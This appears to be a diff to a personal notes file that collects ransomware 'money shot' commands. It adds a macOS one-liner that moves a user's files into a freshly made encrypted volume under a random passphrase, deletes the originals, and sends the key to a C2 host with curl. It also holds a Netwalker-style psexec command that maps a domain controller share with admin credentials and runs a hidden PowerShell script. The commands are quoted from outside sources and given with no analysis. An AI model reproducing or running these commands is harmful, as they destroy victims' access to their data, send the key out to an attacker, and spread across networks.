@@ -1,5 +1,10 @@
 # notes 
 
+### The Apple Money Shot - Ransomware in a single tweet from @lordx64 
+````
+sh -c 'p=$(head -n 1024 /dev/urandom | strings| grep -o "[[:alnum:]]" | head -n 64| tr -d "\n"); diskutil apfs addVolume disk1 APFS x -passphrase "$p"; rsync -zvh --remove-source-files ~/exfil/* /Volumes/x; diskutil umount x; curl -0 http://C2/"$p"'
+````
+
 ### The Money Shot - Netwalker Ransomware via DFIR Report
 ````
 C:\psexec.exe @ip-list.txt -d cmd /c “(net use q: /delete /y &; net use q: \\DomainController\DomainName /user:DomainName\administrator ThisWasThePassword &; powershell -ExecutionPolicy ByPass -NoLogo -NoProfile -windowstyle hidden -NoExit -File q:\P100119.ps1”
